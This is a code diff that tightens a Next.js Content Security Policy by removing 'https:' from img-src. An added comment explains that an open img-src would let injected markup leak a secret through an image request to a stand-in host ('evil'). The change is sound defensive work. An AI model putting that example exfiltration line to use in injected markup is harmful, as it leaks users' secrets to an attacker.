@@ -7,12 +7,16 @@ import type { NextConfig } from "next";
 // Fonts is the only external origin (see app/layout.tsx). The share page
 // and the authorize form set their own, stricter CSP — browsers enforce
 // every policy present, so the strictest one wins there.
+// img-src is 'self' data: only, not https: — an open img-src lets injected
+// markup exfiltrate data via new Image().src = 'https://evil/?x='+secret,
+// which connect-src's 'self' does nothing to stop (image loads aren't
+// fetch/XHR). The cost: note images hosted on other https domains won't load.
 const CSP = [
   "default-src 'self'",
   "script-src 'self' 'unsafe-inline'",
   "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
   "font-src 'self' https://fonts.gstatic.com",
-  "img-src 'self' https: data:",
+  "img-src 'self' data:",
   "connect-src 'self'",
   "object-src 'none'",
   "base-uri 'self'",
